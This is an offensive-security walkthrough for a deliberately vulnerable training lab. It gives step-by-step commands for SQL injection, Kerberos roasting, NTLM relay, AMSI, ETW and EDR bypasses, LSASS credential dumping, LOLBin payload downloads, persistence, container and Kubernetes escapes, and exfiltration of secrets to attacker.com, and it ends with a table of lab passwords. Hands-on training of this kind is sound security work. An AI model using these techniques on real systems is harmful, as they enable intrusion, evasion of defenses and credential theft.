# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE

**Objective:** This guide details the step-by-step exploitation paths for the Modern Kill Lab.

**Attacker Machine:** You can use your own Kali Linux VM (connected to the `psycholab` network) or the `Lab-Web01` machine (via SSH) to launch some of these attacks.

---

# PART 1: CORE ATTACK VECTORS

---

## 🛑 VECTOR 1: SQL Injection (Data Exfiltration)

**Target:** Legacy HR Portal (`Lab-DC01`)  
**URL:** `http://10.0.0.10/hr_portal`

### 1. Reconnaissance

The application takes an `id` parameter via the URL.

* **Action:** Open your browser to `http://10.0.0.10/hr_portal/index.php?id=1`
* **Observation:** The page returns "Name: Alice Manager".

### 2. Vulnerability Testing

* **Action:** Add a single quote `'` to the end of the ID.
* **URL:** `http://10.0.0.10/hr_portal/index.php?id=1'`
* **Result:** PHP/SQL error or blank page = **Vulnerable**.

### 3. Exploitation (UNION Based)

* **Try:** `?id=1 UNION SELECT 1, 2`
* **Result:** If "1" or "2" appears, we have 2 columns.

### 4. Data Dump

* **Payload:** `?id=1 UNION SELECT @@version, user_name()`
* **Result:** SQL Server version and user `LAB\svc_sql`.

### 5. Enable Shell Access (xp_cmdshell)

```
?id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
?id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
?id=1; EXEC xp_cmdshell 'ping 10.0.0.20';--
```

---

## 🤖 VECTOR 2: AI Prompt Injection to RCE

**Target:** NeuroCorp Internal AI (`Lab-Web01`)  
**URL:** `http://10.0.0.20:5000`

### 1. Reconnaissance

* **Action:** Visit `http://10.0.0.20:5000/ask?query=hello`

### 2. Command Injection (RCE)

The Python script passes your `query` directly to shell.

* **Payload:** `http://10.0.0.20:5000/ask?query=ls -la`
* **Result:** File listing of the web directory.

### 3. Privilege Escalation / Pivot

* **Payload:** `http://10.0.0.20:5000/ask?query=whoami` → `root`
* **Steal Kubeconfig:**
  ```
  http://10.0.0.20:5000/ask?query=cat /home/vagrant/.kube/config
  ```

---

## 🔨 VECTOR 3: AS-REP Roasting

**Target:** Active Directory (`Lab-DC01`)  
**Requirement:** Network access only (no credentials needed).

### 1. The Theory

If "Do not require Kerberos preauthentication" is enabled, anyone can request a TGT encrypted with the user's password hash.

### 2. Execution (Kali)

```bash
GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10
```

### 3. Crack the Hash

```bash
hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt
```

**Password:** `Backup2024!`

---

## 🎫 VECTOR 4: Kerberoasting

**Target:** Active Directory (`Lab-DC01`)  
**Requirement:** Any valid domain credentials.

### 1. The Theory

Service accounts with SPNs can have their TGS tickets requested and cracked offline.

### 2. Execution (Kali)

```bash
# Request TGS for svc_sql (has SPN: MSSQLSvc/dc01.lab.local:1433)
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request
```

### 3. Crack the Hash

```bash
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
```

**Password:** `Password123!`

---

## ☁️ VECTOR 5: Hybrid Identity Lateral Movement

**Target:** Azure AD Connect Decoy (`Lab-DC01`)  
**Access Required:** Initial access to DC01.

### 1. The Hunt

* **Path:** `C:\Program Files\Azure AD Sync\connection.xml`

### 2. The Loot

* **Value:** `VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==`

### 3. The Crack

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
```

**Result:** `Valhalla123!`

---

## 🛡️ VECTOR 6: AD CS Relay (ESC8)

**Target:** Certificate Authority (`Lab-DC01`)  
**URL:** `http://10.0.0.10/certsrv`

### 1. Verification

The CA uses HTTP (unencrypted) — vulnerable to NTLM relay.

### 2. Attack (Kali)

```bash
# Terminal 1
sudo responder -I eth0 -rdw

# Terminal 2
ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Trigger via SQLi
?id=1; EXEC xp_cmdshell 'ping <YOUR_KALI_IP>';--
```

**Result:** Certificate for DC machine account.

---

# PART 2: DEFENSE EVASION & IN-MEMORY ATTACKS

---

## 🛡️ VECTOR 7: AMSI Bypass

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\AMSILab`

### 1. The Vulnerability

AMSI provider registry keys have weak ACLs (Users = FullControl).

### 2. Bypass Techniques

**A. Registry Provider Removal:**
```powershell
# Remove AMSI providers
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse
```

**B. In-Memory Patch (Matt Graeber style):**
```powershell
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
$b.SetValue($null,[IntPtr]::Zero)
```

**C. Reflection Method:**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### 3. Verify Bypass

```powershell
# This should execute without AMSI blocking
Invoke-Expression 'Write-Host "AMSI Bypassed!"'
```

---

## 🔒 VECTOR 8: VEH/EDR Bypass

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\VEHLab`

### 1. The Scenario

`FakeEDR.exe` uses Vectored Exception Handlers for monitoring.

### 2. Bypass Techniques

**A. Remove VEH Handler:**
```c
// Use RemoveVectoredExceptionHandler API
// Walk the VEH chain and remove target handler
```

**B. Hardware Breakpoint Manipulation:**
```c
// Clear DR0-DR7 registers
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);
ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
ctx.Dr7 = 0;
SetThreadContext(hThread, &ctx);
```

**C. Direct Syscalls:**
Bypass userland hooks entirely by calling kernel directly.

---

## 💉 VECTOR 9: Reflective Code Injection

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\ReflectiveLab`

### 1. The Vulnerability

`VulnerableLoader.cs` loads any .NET assembly from bytes without validation.

### 2. Exploitation

**A. Compile Malicious Assembly:**
```csharp
// payload.cs
using System;
class Payload {
    static void Main() {
        System.Diagnostics.Process.Start("calc.exe");
    }
}
```

```bash
csc /out:payload.exe payload.cs
```

**B. Execute via Vulnerable Loader:**
```powershell
C:\Tools\ReflectiveLab\VulnerableLoader.exe C:\path\to\payload.exe
```

### 3. Advanced: In-Memory Only

```powershell
$bytes = [System.IO.File]::ReadAllBytes("payload.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, $null)
```

---

## 👻 VECTOR 10: Process Hollowing

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\HollowingLab`

### 1. Target Selection

| Difficulty | Process |
|------------|---------|
| Easy | `notepad.exe` |
| Medium | `svchost.exe` |
| Hard | `werfault.exe` |

### 2. Technique Steps

1. Create target process in suspended state
2. Unmap original executable (`NtUnmapViewOfSection`)
3. Allocate memory at preferred base
4. Write payload PE
5. Set thread context (entry point)
6. Resume thread

### 3. Tools

- Custom C/C++ loader
- Donut (shellcode generator)
- Process Hacker (verification)

---

## 🔑 VECTOR 11: Credential Dumping

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\CredLab`

### 1. Credential Manager

```powershell
# View stored credentials
cmdkey /list

# Credentials present:
# fileserver.lab.local -> LAB\backup_admin : BackupP@ss123!
# sqlserver.lab.local -> sa : SQLAdm1n!
```

**Extract with Mimikatz:**
```
mimikatz# vault::cred /patch
```

### 2. SAM/SYSTEM/SECURITY Hives

Pre-extracted backups available:
```
C:\Tools\CredLab\SAM.bak
C:\Tools\CredLab\SYSTEM.bak
C:\Tools\CredLab\SECURITY.bak
```

**Extract hashes (Kali):**
```bash
secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL
```

### 3. LSASS Dumping

**A. Task Manager:**
Right-click `lsass.exe` → Create dump file

**B. ProcDump:**
```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

**C. comsvcs.dll (LOLBin):**
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

**D. Direct Syscalls (Evasion):**
Use nanodump, HandleKatz, or custom tools with direct syscalls.

---

## 🦎 VECTOR 12: LOLBin Attacks

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\LOLBinLab`

### 1. MSBuild Execution

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\LOLBinLab\payload.csproj
```

### 2. Certutil Download

```cmd
certutil -urlcache -split -f http://10.0.0.20/payload.exe C:\Windows\Temp\payload.exe
```

### 3. WMIC Execution

```cmd
wmic process call create "powershell -enc <BASE64>"
```

### 4. Rundll32 JavaScript

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")
```

### 5. MSHTA

```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")
```

---

## 📊 VECTOR 13: ETW & Logging Bypass

**Target:** `Lab-DC01`

### 1. Current State

PowerShell ScriptBlock Logging is **ENABLED** — your commands are logged.

### 2. Bypass Techniques

**A. Patch ETW:**
```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$b=$a.GetField('etwProvider','NonPublic,Static')
$c=New-Object System.Diagnostics.Eventing.EventProvider(New-Object Guid)
$b.SetValue($null,$c)
```

**B. Disable ScriptBlock Logging:**
```powershell
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
$gpo = $settings.GetValue($null)
$gpo['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

**C. PowerShell Downgrade:**
```cmd
powershell -version 2 -command "malicious stuff"
```

---

## 🔄 VECTOR 14: Persistence Hunting & Planting

**Target:** `Lab-DC01`  
**Path:** `C:\Tools\PersistenceLab`

### 1. Pre-Planted Persistence

A hidden scheduled task exists:

```powershell
Get-ScheduledTask -TaskName "WindowsDefenderUpdate"
```

This runs at logon as SYSTEM.

### 2. Additional Persistence Techniques

**A. Registry Run Keys:**
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\Temp\payload.exe"
```

**B. WMI Event Subscription:**
```powershell
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "BadFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}
```

**C. COM Hijacking:**
Target frequently-called CLSIDs in `HKCU\Software\Classes\CLSID\`.

---

# PART 3: LINUX & CONTAINER ATTACKS

---

## 🐳 VECTOR 15: Container Escapes

**Target:** `Lab-Web01`  
**Path:** `/home/vagrant/container_lab`

### 1. Privileged Container Escape

```bash
# Enter the privileged container
docker exec -it container_lab-vuln_privileged-1 bash

# Inside container - mount host filesystem
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt
```

### 2. Docker Socket Escape

```bash
# Enter the socket-mounted container
docker exec -it container_lab-vuln_hostsock-1 bash

# Inside container - create privileged container
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
```

---

## ☸️ VECTOR 16: Kubernetes Attacks

**Target:** `Lab-Web01`  
**Path:** `/home/vagrant/k8s_lab`

### 1. Enumerate from Compromised Pod

```bash
# Get service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Query API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces
```

### 2. Abuse Overly Permissive ServiceAccount

The `vuln-admin-sa` has **cluster-admin** privileges:

```bash
kubectl --as=system:serviceaccount:default:vuln-admin-sa get secrets --all-namespaces
```

### 3. Deploy Privileged Pod

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  serviceAccountName: vuln-admin-sa
  containers:
  - name: pwned
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF
```

---

## 🐧 VECTOR 17: Linux Privilege Escalation

**Target:** `Lab-Web01`

### 1. Sudo Abuse (vim)

```bash
sudo vim -c ':!/bin/bash'
```

You now have a root shell.

### 2. Capabilities Abuse (python_cap)

```bash
/usr/local/bin/python_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 3. Enumeration Tools

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Find capabilities
getcap -r / 2>/dev/null

# Check sudo permissions
sudo -l
```

---

## 📤 VECTOR 18: Data Exfiltration

**Target:** `Lab-Web01`  
**Path:** `/home/vagrant/exfil_lab`

### 1. Sample Data

```bash
cat /home/vagrant/exfil_lab/.env
# API_KEY=sk_live_1234567890abcdef
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
```

### 2. DNS Exfiltration

```bash
data=$(cat /home/vagrant/exfil_lab/.env | base64 | tr '+/' '-_' | fold -w 60)
for chunk in $data; do
    nslookup $chunk.attacker.com
done
```

### 3. ICMP Exfiltration

```bash
xxd -p /home/vagrant/exfil_lab/.env | while read line; do
    ping -c 1 -p "$line" 10.0.0.1
done
```

### 4. HTTP Exfiltration

```bash
curl -X POST -d @/home/vagrant/exfil_lab/.env http://attacker.com/collect
```

---

# APPENDIX: QUICK REFERENCE

## Credentials Cheat Sheet

| Account | Password | Use Case |
|---------|----------|----------|
| `LAB\vagrant` | `Vagrant!123` | Initial access |
| `LAB\svc_sql` | `Password123!` | Kerberoasting, SQLi |
| `LAB\svc_backup` | `Backup2024!` | AS-REP Roasting |
| `LAB\helpdesk` | `Help123!` | Low-priv domain user |
| `svc_adsync` | `Valhalla123!` | Hybrid identity |
| `fileserver.lab.local` | `BackupP@ss123!` | Credential Manager |
| `sqlserver.lab.local (sa)` | `SQLAdm1n!` | Credential Manager |
| `vagrant` (Linux) | `vagrant` | SSH access |

## Tool Recommendations

| Category | Tools |
|----------|-------|
| AD Attacks | Impacket, BloodHound, Rubeus, Mimikatz |
| Evasion | SysWhispers, nanodump, Donut |
| LOLBins | LOLBAS Project reference |
| Containers | deepce, kubeaudit, kubectl |
| Linux PE | LinPEAS, pspy, GTFOBins |

---

*End of Guide. Proceed with caution.*
